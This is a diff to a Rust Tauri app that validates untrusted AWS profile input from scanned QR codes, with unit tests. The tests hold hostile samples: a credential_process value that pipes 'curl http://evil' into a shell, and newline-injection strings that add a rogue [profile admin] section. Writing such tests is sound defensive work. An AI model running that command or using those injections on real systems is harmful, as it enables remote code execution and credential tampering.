@@ -230,6 +230,48 @@ pub async fn get_credentials(
     }))
 }
 
+/// Keys this app is ever allowed to write into `~/.aws`.
+///
+/// Deliberately excludes `credential_process` and `credential_source`: both are
+/// *executed* by every AWS SDK when the profile is resolved, so accepting them
+/// would turn a scanned QR code into arbitrary command execution.
+const ALLOWED_PROFILE_KEYS: [&str; 8] = [
+    "aws_access_key_id",
+    "aws_secret_access_key",
+    "aws_session_token",
+    "region",
+    "output",
+    "role_arn",
+    "source_profile",
+    "mfa_serial",
+];
+
+/// Validates untrusted profile input before it is written to `~/.aws`.
+///
+/// These files are shared with the AWS CLI/SDKs and `properties` can come
+/// straight from a scanned QR code, so nothing here is trusted. A value
+/// containing a newline could inject arbitrary extra profile sections.
+pub fn validate_profile_input(
+    name: &str,
+    properties: &std::collections::HashMap<String, String>,
+) -> Result<(), String> {
+    if name.is_empty() || name.contains(['\n', '\r', '[', ']']) {
+        return Err("Invalid profile name".into());
+    }
+    for (k, v) in properties.iter() {
+        if k == "profile" {
+            continue;
+        }
+        if !ALLOWED_PROFILE_KEYS.contains(&k.as_str()) {
+            return Err(format!("Unsupported profile key: {}", k));
+        }
+        if v.contains(['\n', '\r']) {
+            return Err(format!("Invalid value for {}", k));
+        }
+    }
+    Ok(())
+}
+
 #[tauri::command]
 pub fn save_profile(
     app_handle: tauri::AppHandle,
@@ -239,36 +281,7 @@ pub fn save_profile(
     use std::fs::OpenOptions;
     use std::io::Write;
 
-    // These files are shared with the AWS CLI/SDKs, and `properties` can come
-    // straight from a scanned QR code, so nothing here is trusted. A value
-    // containing a newline could inject arbitrary extra profile sections, and
-    // `credential_process`/`credential_source` are *executed* by every AWS SDK
-    // when the profile is resolved — neither is ever written by this app.
-    const ALLOWED_KEYS: [&str; 8] = [
-        "aws_access_key_id",
-        "aws_secret_access_key",
-        "aws_session_token",
-        "region",
-        "output",
-        "role_arn",
-        "source_profile",
-        "mfa_serial",
-    ];
-
-    if name.is_empty() || name.contains(['\n', '\r', '[', ']']) {
-        return Err("Invalid profile name".into());
-    }
-    for (k, v) in properties.iter() {
-        if k == "profile" {
-            continue;
-        }
-        if !ALLOWED_KEYS.contains(&k.as_str()) {
-            return Err(format!("Unsupported profile key: {}", k));
-        }
-        if v.contains(['\n', '\r']) {
-            return Err(format!("Invalid value for {}", k));
-        }
-    }
+    validate_profile_input(&name, &properties)?;
 
     let aws_dir = get_aws_dir(&app_handle)?;
 
@@ -520,5 +533,121 @@ pub async fn open_file(path: String) -> Result<(), String> {
     #[cfg(not(any(target_os = "android", target_os = "ios")))]
     {
         open_folder(path).await
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashMap;
+
+    fn props(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    #[test]
+    fn accepts_a_normal_profile() {
+        let p = props(&[
+            ("aws_access_key_id", "AKIAIOSFODNN7EXAMPLE"),
+            ("aws_secret_access_key", "secret"),
+            ("region", "us-east-1"),
+        ]);
+        assert!(validate_profile_input("work", &p).is_ok());
+    }
+
+    #[test]
+    fn ignores_the_profile_key_itself() {
+        // The frontend passes the whole scanned object, including "profile".
+        let p = props(&[("profile", "work"), ("region", "us-east-1")]);
+        assert!(validate_profile_input("work", &p).is_ok());
+    }
+
+    /// credential_process is executed by every AWS SDK when the profile is
+    /// resolved, so accepting it from a scanned QR code is remote code
+    /// execution that persists outside this app.
+    #[test]
+    fn rejects_credential_process() {
+        let p = props(&[("credential_process", "/bin/sh -c 'curl http://evil|sh'")]);
+        assert!(validate_profile_input("default", &p).is_err());
+    }
+
+    #[test]
+    fn rejects_credential_source() {
+        let p = props(&[("credential_source", "Ec2InstanceMetadata")]);
+        assert!(validate_profile_input("default", &p).is_err());
+    }
+
+    #[test]
+    fn rejects_unknown_keys() {
+        let p = props(&[("sso_start_url", "https://example.com")]);
+        assert!(validate_profile_input("default", &p).is_err());
+    }
+
+    /// A newline in a value would close the current section and let the caller
+    /// append arbitrary extra [profile ...] blocks.
+    #[test]
+    fn rejects_newlines_in_values() {
+        for injected in [
+            "us-east-1\n[profile admin]\naws_access_key_id = AKIA",
+            "us-east-1\r\nfoo = bar",
+        ] {
+            let p = props(&[("region", injected)]);
+            assert!(
+                validate_profile_input("default", &p).is_err(),
+                "should reject value: {injected:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_section_injection_via_name() {
+        for bad in ["", "a\nb", "a\rb", "we[ird", "we]ird"] {
+            assert!(
+                validate_profile_input(bad, &HashMap::new()).is_err(),
+                "should reject name: {bad:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn parses_ini_sections_and_keys() {
+        let dir = std::env::temp_dir().join("clouddash_parse_ini_test");
+        let _ = std::fs::create_dir_all(&dir);
+        let path = dir.join("config");
+        std::fs::write(
+            &path,
+            "[default]\nregion = us-east-1\n\n[profile work]\nregion = eu-west-1\noutput = json\n",
+        )
+        .unwrap();
+
+        let parsed = parse_ini(&path);
+        assert_eq!(
+            parsed.get("default").and_then(|s| s.get("region")),
+            Some(&"us-east-1".to_string())
+        );
+        // The "profile " prefix used in ~/.aws/config is stripped, so config and
+        // credentials sections for the same profile share one key.
+        assert!(
+            !parsed.contains_key("profile work"),
+            "the 'profile ' prefix should be stripped"
+        );
+        assert_eq!(
+            parsed.get("work").and_then(|s| s.get("output")),
+            Some(&"json".to_string())
+        );
+        assert_eq!(
+            parsed.get("work").and_then(|s| s.get("region")),
+            Some(&"eu-west-1".to_string())
+        );
+        let _ = std::fs::remove_file(&path);
+    }
+
+    #[test]
+    fn parse_ini_returns_empty_for_a_missing_file() {
+        let parsed = parse_ini(std::path::Path::new("/nonexistent/clouddash/config"));
+        assert!(parsed.is_empty());
     }
 }
